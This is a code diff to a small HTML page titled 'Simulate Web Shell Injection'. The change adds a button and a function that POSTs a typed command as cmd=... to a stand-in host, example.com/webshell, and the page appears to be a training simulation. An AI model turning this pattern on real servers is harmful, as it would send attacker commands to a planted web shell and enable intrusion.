@@ -11,7 +11,7 @@
       text-align: center;
       padding-top: 80px;
     }
-    input {
+    input, button {
       width: 60%;
       padding: 12px;
       font-size: 18px;
@@ -22,14 +22,23 @@
 <body>
   <h1>Simulate Web Shell Injection</h1>
   <input id="cmdInput" placeholder="Enter command..." />
+  <button onclick="sendCommand()">Submit Command</button>
   <div id="log" style="margin-top: 30px;"></div>
 
   <script>
-    document.getElementById("cmdInput").addEventListener("input", (e) => {
-      const value = e.target.value;
-      const log = document.getElementById("log");
-      log.innerText = `You entered: ${value}`;
-    });
+    function sendCommand() {
+      const cmd = document.getElementById("cmdInput").value;
+      document.getElementById("log").innerText = `Sending: ${cmd}`;
+
+      // Simulated POST request with cmd=...
+      fetch("https://example.com/webshell", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: `cmd=${encodeURIComponent(cmd)}`
+      });
+    }
   </script>
 </body>
 </html>
